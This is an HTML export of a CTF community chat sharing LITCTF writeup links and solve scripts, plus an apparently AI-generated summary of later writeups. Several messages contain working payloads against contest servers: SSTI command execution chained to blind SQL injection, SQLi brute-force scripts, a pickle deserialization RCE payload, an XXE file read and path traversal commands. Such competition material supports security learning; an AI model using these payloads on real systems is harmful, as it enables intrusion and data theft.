+      <div class="content"><a href="https://github.com/extremecoders-re/pyinstxtractor" target="_blank">https://github.com/extremecoders-re/pyinstxtractor</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T03:58:15.959000+00:00</span>
+      <div class="content"><a href="https://github.com/CTF-Team-PlusPlusC/LITCTF2022-Writeups/tree/main/trash-royale" target="_blank">https://github.com/CTF-Team-PlusPlusC/LITCTF2022-Writeups/tree/main/trash-royale</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T19:25:02.940000+00:00</span>
+      <div class="content"><a href="https://ctftime.org/writeup/34639" target="_blank">https://ctftime.org/writeup/34639</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T17:49:50.844000+00:00</span>
+      <div class="content"><a href="https://ctftime.org/event/1694/tasks/" target="_blank">https://ctftime.org/event/1694/tasks/</a> also you can now upload stuff onto ctftime :D</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T16:45:50.234000+00:00</span>
+      <div class="content">&lt;<a href="https://github.com/sajjadium/ctf-archives/tree/main/LIT&gt;" target="_blank">https://github.com/sajjadium/ctf-archives/tree/main/LIT&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T16:42:05.799000+00:00</span>
+      <div class="content">&lt;<a href="https://github.com/randorisec/CVE-2022-34918-LPE-PoC&gt;" target="_blank">https://github.com/randorisec/CVE-2022-34918-LPE-PoC&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T13:15:21.788000+00:00</span>
+      <div class="content"><a href="https://github.com/ckc1404/CTF_writeups/tree/main/LIT%20CTF" target="_blank">https://github.com/ckc1404/CTF_writeups/tree/main/LIT%20CTF</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T12:12:58.910000+00:00</span>
+      <div class="content">some writeups for the web challenges:
+<a href="https://drive.google.com/drive/folders/14D6mLl_97-5HAOUn5lYcdsV96eE2gPlF?usp=sharing" target="_blank">https://drive.google.com/drive/folders/14D6mLl_97-5HAOUn5lYcdsV96eE2gPlF?usp=sharing</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T11:06:09.967000+00:00</span>
+      <div class="content"><a href="https://github.com/0xEsperance/CTF-Writeups/blob/main/Lexington%20Informatics%20Tournament%20CTF%202022/rev/addition.md" target="_blank">https://github.com/0xEsperance/CTF-Writeups/blob/main/Lexington%20Informatics%20Tournament%20CTF%202022/rev/addition.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T06:55:30.906000+00:00</span>
+      <div class="content"><a href="https://kihun0422.tistory.com/13" target="_blank">https://kihun0422.tistory.com/13</a> my addition writeup but you will need translation extension cause its in Korean</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T06:33:27.935000+00:00</span>
+      <div class="content"><a href="https://github.com/Iscaraca/ctf-writeups/tree/main/LITCTF/Web/Flushed%20Emoji" target="_blank">https://github.com/Iscaraca/ctf-writeups/tree/main/LITCTF/Web/Flushed%20Emoji</a> flushed emoji writeup but for people who dont really understand wtf was going on like i did</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T06:26:20.868000+00:00</span>
+      <div class="content"><a href="https://github.com/fallow64/CTF_Writeups/tree/main/LITCTF%202022/Flushed%20Emoji" target="_blank">https://github.com/fallow64/CTF_Writeups/tree/main/LITCTF%202022/Flushed%20Emoji</a> here's a writeup for flushed emoji</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T05:12:12.321000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/among-us-twerk-thicc-among-us-twerk-funny-among-us-gif-20511920" target="_blank">https://tenor.com/view/among-us-twerk-thicc-among-us-twerk-funny-among-us-gif-20511920</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:23:37.882000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/738848412912451695/866529872737075221/1000979550546690089" target="_blank">https://discord.com/channels/738848412912451695/866529872737075221/1000979550546690089</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:18:58.811000+00:00</span>
+      <div class="content">This is the last draft I have and probably includes bugs, but this was the general idea that didn't work: `{{lipsum['__globals__']['os']|attr('popen')('python3 -c "from ipaddress import ip_address;a=str(ip_address(2887254024));from requests import post;print(post('<a href="http://'+a+':8080/runquery'," target="_blank">http://'+a+':8080/runquery',</a> json='{'username':'a' 'password':'yo'}))"')|attr('read')()}}`</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:16:27.009000+00:00</span>
+      <div class="content"><a href="https://github.com/kiyotaka-akaiwa/ctf-writeups/tree/main/LITCTF/2022" target="_blank">https://github.com/kiyotaka-akaiwa/ctf-writeups/tree/main/LITCTF/2022</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:15:22.151000+00:00</span>
+      <div class="content">My thought processes for the three geoguesser challenges:
+
+Warm-up (LITCTF{36.122,-5.350}) - The sign on the left almost certainly belongs to a pub (Arms in the name, the font) and the sign on the wall belongs to the British beer brand Bass. If you squint you should even be able to see "Supplies Ltd" at the end of the next sign too, implying that this is in an English speaking territory. The most significant British territory with a Southern European, temperate climate is Gibraltar. Google gibraltar + pub + arms to find the Edinburgh Arms. 
+
+Normal: (LITCTF{22.189,113.539}): The sign in the foreground is written in both Portuguese and Chinese, meaning that this is almost definitely Macau, a former Portuguese colony in China - especially because of the prominent skyline. Find the most significant landmark in the image, the skyscraper with the red orb on top, by browsing Macau's tallest buildings (<a href="https://en.wikipedia.org/wiki/List_of_tallest_buildings_in_Macau," target="_blank">https://en.wikipedia.org/wiki/List_of_tallest_buildings_in_Macau,</a> number 11) then appproximate where the image was taken from.
+
+Hard: ( LITCTF{13.775,-13.669}) This is extremely likely in a current or former French colony in Africa, judging by the Pan-African colors being painted on both the tree and the power station to the left, the fact that "Hotel de Ville" is the French name for a town hall, the climate and vegetation and there being a Sub-Saharan African man visible in the background. You could approximate the country by sifting through "hotel de ville" + every African country with those colors in their flag, ending up with Senegal, but with the right crop Google Lens actually shows you several news articles confirming that this is in Tambacounda, Senegal. Find the location manually with street view, it's not a big place.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:12:34.976000+00:00</span>
+      <div class="content">Okay I frickin loved flushed emoji, you have to exploit an SSTI vulnerability to run arbitrary code to run commands through Python to send HTTP requests through the requests module to exploit a boolean-based blind vulnerability on an adjacent web server... After using SSTI to run arbitrary commands, there was no wget, curl, nc, ip, ping, etc for external networking and external reverse shell didn't work. That's when I realized that we could just do what they did and use the `requests` library in Python to exploit the blind SQL injection. So, I made a super ugly one liner with layers of escaping text for quote levels to work and bypass the stupid period filter. This is what my payload to brute force the flag ended up looking like:
+
+```username=test&amp;password={{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('python3+-c+"exec(\'import+requests;print(requests\x2epost(\\"<a href="http://172\\x2e24\\x2e0\\x2e8:8080/runquery\\",json={\\"username\\":\\"\\x27+OR+(SELECT+COUNT(password)+FROM+users+WHERE+username=\\x27flag\\x27+AND+password+LIKE+\\x27LITCTF{\\x25\\x27)=1--\\",\\"password\\":\\"test\\"})\x2etext)\')"')['read']()}}```" target="_blank">http://172\\x2e24\\x2e0\\x2e8:8080/runquery\\",json={\\"username\\":\\"\\x27+OR+(SELECT+COUNT(password)+FROM+users+WHERE+username=\\x27flag\\x27+AND+password+LIKE+\\x27LITCTF{\\x25\\x27)=1--\\",\\"password\\":\\"test\\"})\x2etext)\')"')['read']()}}```</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:08:07.208000+00:00</span>
+      <div class="content"><a href="https://forms.gle/KZNtzJMKdSa487Z68" target="_blank">https://forms.gle/KZNtzJMKdSa487Z68</a> Please submit your writeups here :D ($200 cash worth of prizes 😻 )</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-25T04:05:46.755000+00:00</span>
+      <div class="content">Blind SQLi. ```py
+import requests
+import string
+
+psw = "LITCTF{"
+i = len(psw) + 1
+while True:
+    for c in string.printable:
+        password = f"' or (SELECT case substr(name,1,{i}) when '{psw+c}' then 1 else 0 end)--"
+        url = f"<a href="http://litctf.live:31781/"" target="_blank">http://litctf.live:31781/"</a>
+        
+        r = requests.post(url, {"username": "admin", "password": password})
+        print(r.text)
+        if r.text == True:
+            psw += c
+            i += 1
+            print(psw)
+            break
+        print(psw+c)
+    
+    if c == "}":
+        break
+print("FLAG:", psw)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-30T21:44:28.531000+00:00</span>
+      <div class="content"><a href="https://downloadmoreram.com" target="_blank">https://downloadmoreram.com</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-22T01:21:01.704000+00:00</span>
+      <div class="content">rev writeups dropped 
+<a href="https://github.com/idekctf/litctf-writeups" target="_blank">https://github.com/idekctf/litctf-writeups</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-21T15:00:17.671000+00:00</span>
+      <div class="content">&lt;<a href="https://ctftime.org/event/1398/tasks/&gt;" target="_blank">https://ctftime.org/event/1398/tasks/&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-20T02:31:04.428000+00:00</span>
+      <div class="content"><a href="https://github.com/datajerk/ctf-write-ups/tree/master/litctf2021" target="_blank">https://github.com/datajerk/ctf-write-ups/tree/master/litctf2021</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T23:46:27.597000+00:00</span>
+      <div class="content"><a href="https://www.lunaverus.com/" target="_blank">https://www.lunaverus.com/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T19:33:17.778000+00:00</span>
+      <div class="content"><a href="https://github.com/guyinatuxedo/nightmare" target="_blank">https://github.com/guyinatuxedo/nightmare</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T19:20:13.329000+00:00</span>
+      <div class="content"><a href="https://0xrick.github.io/binary-exploitation/bof1/" target="_blank">https://0xrick.github.io/binary-exploitation/bof1/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T18:48:16.917000+00:00</span>
+      <div class="content">writeup for geometry is fun ig
+<a href="https://docs.google.com/document/d/1O_DBFYMAClKCGIHLl2qHB-DtUGow6aBhkjbv0YXP1Zk/edit?usp=sharing" target="_blank">https://docs.google.com/document/d/1O_DBFYMAClKCGIHLl2qHB-DtUGow6aBhkjbv0YXP1Zk/edit?usp=sharing</a>
+(idk if there is a format for writeups so sorry if I didn't explain something in detail &lt;:blurry_eyes:787039417436209193&gt;)
+simple tl;dr is find triangle areas, use a cipher (a=1, b=2, c=3, ...) and wrap that in flag{}</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T10:21:07.520000+00:00</span>
+      <div class="content">alex fan club writeup by my teamate <a href="https://noob3xploiter.medium.com/lit-ctf-alex-fan-club-sql-injection-with-strict-blacklist-7abbcd402751" target="_blank">https://noob3xploiter.medium.com/lit-ctf-alex-fan-club-sql-injection-with-strict-blacklist-7abbcd402751</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T08:25:17.293000+00:00</span>
+      <div class="content"><a href="https://github.com/SuperStormer/writeups/tree/master/litctf_2021" target="_blank">https://github.com/SuperStormer/writeups/tree/master/litctf_2021</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T06:53:19.274000+00:00</span>
+      <div class="content">We will gradually upload all of our source codes here btw <a href="https://github.com/LexMACS/LIT-CTF-2021" target="_blank">https://github.com/LexMACS/LIT-CTF-2021</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T06:15:16.185000+00:00</span>
+      <div class="content">and also ```html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;script src="<a href="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.2/socket.io.js"&gt;&lt;/script&gt;" target="_blank">https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.2/socket.io.js"&gt;&lt;/script&gt;</a>
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script src="brute.js"&gt;
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T06:15:04.939000+00:00</span>
+      <div class="content">```js
+var socket = io("<a href="http://websites.litctf.live:8000/");" target="_blank">http://websites.litctf.live:8000/");</a>
+
+socket.on('reqNameRes', (name) =&gt; {
+    if(name) {
+        console.log(name);
+    }
+});
+
+for(let i = 0; i &lt; 1000; i++) {
+    socket.emit('reqName', i);
+}```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T05:50:21.815000+00:00</span>
+      <div class="content">I used <a href="https://www.quipqiup.com/" target="_blank">https://www.quipqiup.com/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T05:42:03.880000+00:00</span>
+      <div class="content"><a href="https://ctftime.org/event/1398/tasks/" target="_blank">https://ctftime.org/event/1398/tasks/</a> i uploaded all my crypto tasks</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T05:24:20.974000+00:00</span>
+      <div class="content">also intended for tree hash (i think everyone cheesed tho 😩 ): &lt;<a href="https://pastebin.com/f5TWzC4g&gt;" target="_blank">https://pastebin.com/f5TWzC4g&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T05:04:37.099000+00:00</span>
+      <div class="content">crypto: &lt;<a href="https://pastebin.com/pP5JuVfK&gt;" target="_blank">https://pastebin.com/pP5JuVfK&gt;</a>
+cheaptricks original (does not work remote): &lt;<a href="https://pastebin.com/rhmymtXc&gt;" target="_blank">https://pastebin.com/rhmymtXc&gt;</a>
+cheaptricks remote: &lt;<a href="https://pastebin.com/NpXwtMm7&gt;" target="_blank">https://pastebin.com/NpXwtMm7&gt;</a>
+scanf: &lt;<a href="https://pastebin.com/He7RxrtN&gt;" target="_blank">https://pastebin.com/He7RxrtN&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:39:06.684000+00:00</span>
+      <div class="content">if all you want is a script <a href="https://github.com/qpwoeirut/CTFs/blob/master/LITCTF/2021/crypto/leftovers/Leftovers/solve_leftovers.py" target="_blank">https://github.com/qpwoeirut/CTFs/blob/master/LITCTF/2021/crypto/leftovers/Leftovers/solve_leftovers.py</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:36:06.482000+00:00</span>
+      <div class="content"><a href="https://sebastianpc.fun/writeups/2021/LITCTF" target="_blank">https://sebastianpc.fun/writeups/2021/LITCTF</a> omg this guy has such a nice writeup for LIT i love it</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:31:53.598000+00:00</span>
+      <div class="content">&lt;<a href="https://www.youtube.com/watch?v=EOlddNofKxo&gt;" target="_blank">https://www.youtube.com/watch?v=EOlddNofKxo&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:31:01.658000+00:00</span>
+      <div class="content"><a href="https://github.com/qpwoeirut/CTFs/blob/master/LITCTF/2021/crypto/merkle_heavenwoman/solve_merkle_heavenwoman.py" target="_blank">https://github.com/qpwoeirut/CTFs/blob/master/LITCTF/2021/crypto/merkle_heavenwoman/solve_merkle_heavenwoman.py</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:17:09.109000+00:00</span>
+      <div class="content"><a href="https://cdn.discordapp.com/attachments/865946153250062356/866292166443008060/unknown.png" target="_blank">https://cdn.discordapp.com/attachments/865946153250062356/866292166443008060/unknown.png</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:17:04.797000+00:00</span>
+      <div class="content">Some web challenges
+AlexFanClub:
+```
+<a href="https://alex-fan-club.litctf.live/?param='%09UNION%09SELECT%09sql%09FROM%09sqlite_master%09WHERE%09sql%09LIKE%09'" target="_blank">https://alex-fan-club.litctf.live/?param='%09UNION%09SELECT%09sql%09FROM%09sqlite_master%09WHERE%09sql%09LIKE%09'</a>
+<a href="https://alex-fan-club.litctf.live/?param='%09UNION%09SELECT%09flag_column%09FROM%09flag_is_in_here%09WHERE%09flag_column%09LIKE%09'" target="_blank">https://alex-fan-club.litctf.live/?param='%09UNION%09SELECT%09flag_column%09FROM%09flag_is_in_here%09WHERE%09flag_column%09LIKE%09'</a>
+```
+Flask of pickles:
+```
+import base64,pickle
+
+class RCE:
+    def __reduce__(self):   
+        import subprocess
+        return subprocess.check_output, (['grep','-r','fla','/'],)
+
+x = {"name":"test","bio":RCE()}
+payload = base64.b64encode(pickle.dumps(x)) 
+
+print(payload)
+```
+AlexFanClubApi:
+```
+import requests
+import base64
+import time
+
+url = "<a href="https://alex-fan-club-api.litctf.live/api"" target="_blank">https://alex-fan-club-api.litctf.live/api"</a>
+
+# number of 9s found through bruteforcing
+high = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+low  = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+i = (high+low)//2
+
+while True:
+
+    sendtime = base64.urlsafe_b64encode(i.to_bytes(512,byteorder="big")).decode()
+    time = f'{sendtime}"&gt; &lt;!ENTITY nowtime SYSTEM "/flag.txt'.encode()
+
+    data = {
+        "time": time,
+        "search": "&lt;search&gt;cool&lt;/search&gt;"
+    }
+
+    response = requests.post(url, data=data)
+    
+    if "lol wtf" in response.text:
+        print(f"target lower than {i}")
+        high = i
+    if "request expired" in response.text:
+        print(f"target higher than {i}")
+        low = i
+    if "cool" in response.text:
+        print(f"found: {i}")
+        break
+
+    i = (high+low)//2
+
+#found: 4117693555152280233235140304313160393372574785286687169479929583036435327748269177565382885337
+
+for j in range(66):
+    flag = base64.urlsafe_b64encode((i+j).to_bytes(39,byteorder="big"))
+    print(flag)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:15:08.053000+00:00</span>
+      <div class="content">There is a wikipedia page for them here <a href="https://en.wikipedia.org/wiki/Three_Pagodas" target="_blank">https://en.wikipedia.org/wiki/Three_Pagodas</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:14:50.603000+00:00</span>
+      <div class="content">misc/CodeTiger ORZ
+
+Use an online split frame by frame tool. At ~12-13 seconds in the video, we can obtain flag{c0detiger_0rz} (i think, idk)
+
+<a href="https://video-photos.com/" target="_blank">https://video-photos.com/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:10:45.662000+00:00</span>
+      <div class="content">see the following <a href="https://www.youtube.com/watch?v=EOlddNofKxo" target="_blank">https://www.youtube.com/watch?v=EOlddNofKxo</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:02:31.522000+00:00</span>
+      <div class="content">i got a pretty detail writeup for AlexFanClubAPi here <a href="https://github.com/letronghoangminh/CTF-Writeups/tree/master/Web/LITCTF%202021%20-%20Alex%20Fan%20Club%20API%20(500)" target="_blank">https://github.com/letronghoangminh/CTF-Writeups/tree/master/Web/LITCTF%202021%20-%20Alex%20Fan%20Club%20API%20(500)</a> star if you found it useful xD</div>
+    </div>
+  </div>
+  <h3>Gemini Chat Summary</h3>
+  <section id="summary">
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LITCTF Writeups Summary</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; }
+        h1, h2, h3, h4 { border-bottom: 1px solid #ccc; padding-bottom: 5px; }
+        h1 { font-size: 2em; }
+        h2 { font-size: 1.75em; margin-top: 2em; }
+        h3 { font-size: 1.5em; margin-top: 1.5em; }
+        h4 { font-size: 1.25em; }
+        a { color: #007bff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        pre { background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
+        code { font-family: monospace; }
+        blockquote { border-left: 4px solid #ddd; padding-left: 1em; margin-left: 0; font-style: italic; }
+        ul { list-style-type: disc; padding-left: 20px; }
+        .category-container { margin-bottom: 2em; }
+        .challenge-item { margin-bottom: 1.5em; }
+    </style>
+</head>
+<body>
+
+    <h1>LITCTF Writeups &amp; Solutions Summary</h1>
+    <p>A comprehensive compilation of writeups, solutions, and discussions for various challenges from LITCTF events spanning multiple years.</p>
+
+    <!-- LITCTF 2025 -->
+    <div id="litctf2025">
+        <h2>LITCTF 2025</h2>
+        <div class="category-container">
+            <h3>Reverse Engineering (rev)</h3>
+            <div class="challenge-item">
+                <h4>mergesort</h4>
+                <p>A complex challenge involving a "twisted" mergesort algorithm. Key insights include:</p>
+                <ul>
+                    <li>The decompiled code was difficult to understand; a <a href="https://chatgpt.com/share/68ae7956-b0d0-8007-bba3-e83f2376ee61" target="_blank" rel="noopener noreferrer">ChatGPT translation</a> was used.</li>
+                    <li>The initial array state is known from <code>out.txt</code>.</li>
+                    <li>The sort only splits if the recursion depth is 3 or less, resulting in at most 16 leaves.</li>
+                    <li>The split logic is unconventional, determined by a seed value:
+                        <pre><code>const unsigned d = static_cast&lt;unsigned&gt;(seed % 9ULL) + 1U; // 1..9
+const size_t mid = lo + (d * len) / 10 - 1;
+seed /= 9ULL;</code></pre>
+                    </li>
+                    <li>The goal is to determine the base-9 digits of the seed by analyzing the sizes of the 15 leaves provided in the <code>md</code> array.</li>
+                    <li><strong>Writeup:</strong> <a href="https://dub.sh/SKBJaa6" target="_blank" rel="noopener noreferrer">https://dub.sh/SKBJaa6</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>Web</h3>
+            <div class="challenge-item">
+                <h4>my-first-website</h4>
+                <ul>
+                    <li><strong>Writeup:</strong> <a href="https://github.com/S450R1/lit-ctf-writeups/tree/main/web/my-first-website" target="_blank" rel="noopener noreferrer">https://github.com/S450R1/lit-ctf-writeups/tree/main/web/my-first-website</a></li>
+                    <li><strong>Detailed Solution:</strong> <a href="https://hyder.n0va.in/posts/lit_ctf/blog/#l1tx00n3wsaaaaaaappn" target="_blank" rel="noopener noreferrer">https://hyder.n0va.in/posts/lit_ctf/blog/#l1tx00n3wsaaaaaaappn</a></li>
+                </ul>
+            </div>
+            <div class="challenge-item">
+                <h4>group chat &amp; group chat2</h4>
+                <ul>
+                    <li><strong>Group Chat 2 Writeup:</strong> <a href="https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat2/README.md" target="_blank" rel="noopener noreferrer">https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat2/README.md</a></li>
+                    <li><strong>Group Chat Writeup:</strong> <a href="https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat/README.md" target="_blank" rel="noopener noreferrer">https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat/README.md</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>Cryptography (crypto)</h3>
+            <div class="challenge-item">
+                <h4>im lagging</h4>
+                <ul>
+                    <li><a href="https://mindcrafters.xyz/writeups/litctf2025-revgame-kaizobrackeys/" target="_blank" rel="noopener noreferrer">mindcrafters.xyz Writeup</a></li>
+                    <li><a href="https://zwique.gitbook.io/zwique_notes/writeups/random-ctf-writeup/im-lagging" target="_blank" rel="noopener noreferrer">zwique.gitbook.io Notes</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>Pwn</h3>
+            <div class="challenge-item">
+                <h4>the mound</h4>
+                <ul>
+                    <li><strong>Writeup:</strong> <a href="https://strangek.vercel.app/blog/writeups/litctf/pwn/mound" target="_blank" rel="noopener noreferrer">https://strangek.vercel.app/blog/writeups/litctf/pwn/mound</a></li>
+                    <li><strong>Video:</strong> <a href="https://youtu.be/OFgmVrguXok" target="_blank" rel="noopener noreferrer">https://youtu.be/OFgmVrguXok</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>General LITCTF 2025 Writeups</h3>
+            <ul>
+                <li><a href="https://github.com/UvuvDev/CTF_Writeups" target="_blank" rel="noopener noreferrer">UvuvDev's CTF_Writeups (Pwn)</a></li>
+                <li><a href="https://maay.gitbook.io/blogs/litctf-2025" target="_blank" rel="noopener noreferrer">maay.gitbook.io Blogs</a></li>
+                <li><a href="https://github.com/50ulR3ap3r/LITCTF" target="_blank" rel="noopener noreferrer">50ulR3ap3r's LITCTF Repo</a></li>
+                <li><a href="https://medium.com/@enderSSSSS/lexington-infomatics-tournament-ctf-2025-writeup-0e3821dd1da9" target="_blank" rel="noopener noreferrer">Medium Article by enderSSSSS</a></li>
+                <li><a href="https://raadalzyoud.github.io/posts/LIT-CTF-2025/" target="_blank" rel="noopener noreferrer">raadalzyoud.github.io Post</a></li>
+                <li><a href="https://abuctf.github.io/posts/LITCTF/" target="_blank" rel="noopener noreferrer">abuctf.github.io Post</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- LITCTF 2024 -->
+    <div id="litctf2024">
+        <h2>LITCTF 2024</h2>
+        <div class="category-container">
+            <h3>Web</h3>
+            <div class="challenge-item">
+                <h4>Multiple Challenges (anti-inspect, jwt-1, jwt-2, traversed)</h4>
+                <p>Solutions by hxuu:</p>
+                <ul>
+                    <li><strong>anti-inspect:</strong> <a href="https://hxuu.github.io/blog/ctf/lit24/anti-inspect/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                    <li><strong>jwt-1:</strong> <a href="https://hxuu.github.io/blog/ctf/lit24/jwt-1/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                    <li><strong>jwt-2:</strong> <a href="https://hxuu.github.io/blog/ctf/lit24/jwt-2/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                    <li><strong>traversed:</strong> <a href="https://hxuu.github.io/blog/ctf/lit24/traversed/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                </ul>
+                <p>Alternative curl-based solutions:</p>
+                <ul>
+                    <li><b>anti-inspect:</b> <code>curl http://litctf.org:31779/</code> and find the flag in a variable.</li>
+                    <li><b>traversed:</b> <code>curl http://litctf.org:31778/?../../../flag.txt --path-as-is</code></li>
+                    <li><b>jwt-1:</b> Get cookie, modify <code>admin</code> to <code>true</code> at jwt.io, then use the new token.</li>
+                    <li><b>jwt-2:</b> Modify <code>index.ts</code> to sign a token with <code>admin: true</code>, then use that token to get the flag.</li>
+                </ul>
+            </div>
+            <div class="challenge-item">
+                <h4>scrainbow</h4>
+                <ul>
+                    <li><strong>Writeup:</strong> <a href="https://github.com/hbsmmsbh/ctf-writeup/blob/main/Lexington%20Informatics%20Tournament%20CTF/2024/web/scrainbow.md" target="_blank" rel="noopener noreferrer">README</a></li>
+                    <li><strong>Solution File:</strong> <a href="https://github.com/hbsmmsbh/ctf-writeup/blob/main/Lexington%20Informatics%20Tournament%20CTF/2024/web/scrainbow_solution.py" target="_blank" rel="noopener noreferrer">scrainbow_solution.py</a></li>
+                    <li><strong>Team-Kirby Writeup:</strong> <a href="https://github.com/Team-Kirby/litctf-2024-writeups/tree/main/web/scrainbow" target="_blank" rel="noopener noreferrer">Repo</a></li>
+                </ul>
+            </div>
+             <div class="challenge-item">
+                <h4>kirbytime</h4>
+                <p>Solution via POST request: <code>curl -X POST -d 'password=kBySlaY' http://34.31.154.223:55601/</code></p>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>Pwn</h3>
+             <div class="challenge-item">
+                <h4>Tomcroppery &amp; pope-shuffle</h4>
+                <ul>
+                    <li><strong>Tomcroppery:</strong> <a href="https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/a%20little%20bit%20of%20tomcroppery/a_little_bit_of_tomcroppery.md" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                    <li><strong>pope-shuffle:</strong> <a href="https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/pope%20shuffle/pope_shuffle.md" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>Reverse Engineering (rev)</h3>
+            <div class="challenge-item">
+                <h4>revsite2</h4>
+                <ul>
+                    <li><strong>Writeup:</strong> <a href="https://github.com/Moreplavec64/ctf-writeups/blob/main/litctf-2024/rev/revsite2/writeup.md" target="_blank" rel="noopener noreferrer">https://github.com/Moreplavec64/ctf-writeups/blob/main/litctf-2024/rev/revsite2/writeup.md</a></li>
+                </ul>
+            </div>
+            <div class="challenge-item">
+                <h4>How to Raise a Boring Vuln Flat</h4>
+                 <ul>
+                    <li><strong>Writeup:</strong> <a href="https://github.com/Lobsterge/CTF-Writeups/blob/main/LIT%20CTF%202024/How%20to%20Raise%20a%20Boring%20Vuln%20Flat/README.md" target="_blank" rel="noopener noreferrer">https://github.com/Lobsterge/CTF-Writeups/blob/main/LIT%20CTF%202024/How%20to%20Raise%20a%20Boring%20Vuln%20Flat/README.md</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>General LITCTF 2024 Writeups</h3>
+            <ul>
+                <li><a href="https://github.com/EnchLolz/LITCTF-24" target="_blank" rel="noopener noreferrer">EnchLolz's LITCTF-24 Repo</a></li>
+                <li><a href="https://github.com/Lobsterge/CTF-Writeups/blob/main/LIT%20CTF%202024/LIT%20arcade/README.md" target="_blank" rel="noopener noreferrer">LIT arcade Writeup</a></li>
+                <li><a href="https://github.com/wLUOw/CTF_Writeups/tree/master/LIT_CTF_2024" target="_blank" rel="noopener noreferrer">wLUOw's CTF_Writeups</a></li>
